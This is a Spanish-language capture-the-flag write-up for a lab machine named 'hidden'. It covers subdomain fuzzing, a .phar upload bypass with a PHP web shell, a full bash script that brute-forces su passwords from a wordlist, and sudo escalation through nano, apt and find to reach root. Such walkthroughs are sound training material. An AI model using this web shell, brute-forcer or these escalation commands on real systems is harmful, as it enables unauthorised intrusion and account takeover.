- Tags: #fuzzing #escalarPrivilegios #linux 
______
comenzamos la maquina con el típico escaneo de nmap, en el cual encontramos que el puerto 80 esta abierto, aplicamos el script básico de reconocimiento pero no encontramos nada relevante.
____
![](attachment/d7d519efa9ff25f2a37ca98e30caf18e.png)
____
aplicaremos fuzzing para listar directorios. para esto utilizaremos gobuster y veremos que nos reporta.
____
![](attachment/4e1fd465447d04a56519153d7dfce264.png)
_______
tenemos dos directorios que podrían llegar a ser interesantes los cuales son /mail y  /js pero al final no tienen nada interesante, por lo que ahora nos enfocamos en hacer fuzzing a subdominios.

para esto utilizaremos la herramienta de wfuzz y aplicaremos el siguiente comando.

```shell
wfuzz -c --hl=9 -w /usr/share/seclists/discovery/DNS/subdomains-top1million-110000.txt -H "host:FUZZ.hidden.lab" -u 172.17.0.2
```

veremos a continuación el resultado de realizar este fuzzing.
______
![](attachment/1d6704be3f94659418ce927278d76269.png)
______
tenemos un **dev** el cual agregaremos a la url y veremos a donde nos lleva.
______
![](attachment/c33632507fc756b14723d57ef4d0a753.png)
_____
tenemos que agrear la nueva url al archivo de hosts, para que nos muestre el contenido.
______
![](attachment/089eb7684ec7cad275e03cd7b974bf4e.png)
_____
nos dice que no se permiten archivos .php, por lo que utilizaremos burpSuite para realizar un ataque de tipo sniper para ver que extensiones si son validas.
____
![](attachment/ba28c25d1eec45c8a7a43fd0a816856b.png)
_______
y vemos que el .phar es valido, por lo debemos crear un payload en php que nos permita ejecutar comandos.

```php
<?php
	echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>";
?>
```

subimos el archivo y probamos a ver si nos deja ejecutar comandos.
____
![](attachment/2ffb2450383b675b09259097c0cb201a.png)
____
es hora de entablar la reverse shell y acceder a la maquina victima.

ganamos acceso como www-data y si listamos los usuarios con el comando `cut -d: -f1 /etc/passwd`

vemos que existen los siguientes usuarios
_____
![](attachment/92a8db446f70337a81d1e6b424afc561.png)
____
verificando los permisos setuid no se encontró nada de utilidad para escalar privilegios.

por lo que aplicamos un sudo -l y nos pide contraseña, por lo que investigando descubrí un script de bash que permite aplicar fuerza bruta a los usuarios disponibles para tratar de encontrar sus contraseñas.

el scritp es el siguiente:

```bash
#!/bin/bash

# Función que se ejecutará en caso de que el usuario no proporcione 2 argumentos.
mostrar_ayuda() {
    echo -e "\e[1;33mUso: $0 USUARIO DICCIONARIO"
    echo -e "\e[1;31mSe deben especificar tanto el nombre de usuario como el archivo de diccionario.\e[0m"
    exit 1
}

# Para imprimir un sencillo banner en alguna parte del script.
imprimir_banner() {
    echo -e "\e[1;34m"  # Cambiar el texto a color azul brillante
    echo "******************************"
    echo "*     BruteForce SU         *"
    echo "******************************"
    echo -e "\e[0m"  # Restablecer los colores a los valores predeterminados
}

# Llamamos a esta función desde el trap finalizar SIGINT (En caso de que el usuario presione control + c para salir)
finalizar() {
    echo -e "\e[1;31m\nFinalizando el script\e[0m"
    exit
}

trap finalizar SIGINT

usuario=$1
diccionario=$2

# Variable especial $# para comprobar el número de parámetros introducido. En caso de no ser 2, se imprimen las instrucciones.
if [[ $# != 2 ]]; then
    mostrar_ayuda
fi

# Imprimimos el banner al momento de realizar el ataque.
imprimir_banner

# Bucle while que lee línea a línea el contenido de la variable $diccionario, que a su vez esta variable recibe el diccionario como parámetro.
while IFS= read -r password; do
    echo "Probando contraseña: $password"
    if timeout 0.1 bash -c "echo '$password' | su $usuario -c 'echo Hello'" > /dev/null 2>&1; then
        clear
        echo -e "\e[1;32mContraseña encontrada para el usuario $usuario: $password\e[0m"
        break
    fi
done < "$diccionario"
```

este script tal vez nos permita saber la contraseña de algún usuario.

las indicaciones nos dicen que se necesita de un diccionario para probar, tenemos el rockyou pero es un diccionario con un peso considerable para poder subirlo a la maquina, por lo que dividiremos el mismo en partes que contengan 1000 palabras por archivos.

aplicamos el siguiente comando al diccionario para dividirlo 

```bash
split -l 1000 /ruta/del/diccionario part_
```

ahora debemos subir tanto el script como el diccionario, del diccionario solo subiremos la primera parte y probaremos.

la sintaxis del script es sencilla y es la siguiente:

```bash
bash scritp.bash <usuario> <diccionario>
```
_____
![](attachment/07f4c3b9d341c980e25b2254b253e271.png)
_____
aplicamos el script a los 3 diferentes usuarios existente pero solo funciono para el usuario cafetero.

por lo que aplicando un `su cafetero` y su clave, lograremos pivotar al usuario cafetero y como conocemos su clave podremos aplicar el comando `sudo -l` y veremos lo siguiente.
____
![](attachment/91d84dcd17671de68c607fa4c4eaa41c.png)
____
nos dice que podemos ejecutar sin clave el comando nano desde el usuario john, y esto es grave puesto que nano tiene una vulnerabilidad que nos permite pivotar al usuario que ejecute el comando de nano.

si aplicamos el comando:

```shell
su -u john /usr/bin/nano nano
```

podremos acceder al nano y aplicar los siguiente comando para pivotar de usuario.

```shell
R^+X^ (CTRL R + CTRL X)
reset; bash 1>&0 2>&0
```

de esta forma pasaremos al usuario john.
______
![](attachment/d8b621e10273c3c8a7407046b52a57ce.png)
____
ahora que somos el usuario john  apliquemos el comando `sudo -l`.
____
![](attachment/a8d2a2ee7de91b3192a02b8c36ef99fc.png)
____
nos dice que podemos ejecutar el comando apt como el usuario bobby sin proporcionar contraseña.

por lo investigaremos la forma de pivotar al usuario bobby por medio del comando apt

y encontramos que si aplicamos el siguiente comando.

```shell
sudo apt changelog apt
!/bin/sh
```

podremos pivotar de usuario, pero debemos adaptar este comando de la siguiente forma.

```shell
sudo -u bobby /usr/bin/apt changelog apt
```
____
![](attachment/dfc30c8395f0b21fb537687246566185.png)
____
y ahora somos usurario bobby apliquemos el comando `sudo -l` para ver que prosigue.
___
![](attachment/5b91db6d1d819ce4ec8a21c784603e51.png)
____
nos dice que podemos ejecutar el comando find como usuario root sin proporcionar contraseña.

busquemos la forma de escalar privilegios por medio del comando find.

```shell
sudo find . -exec /bin/sh \; -quit
```

con el siguiente comando lograremos ser root.
____
![](attachment/8ecec2b889f393e4903a64823917017a.png)
___
damos por culminada la maquina hidden.



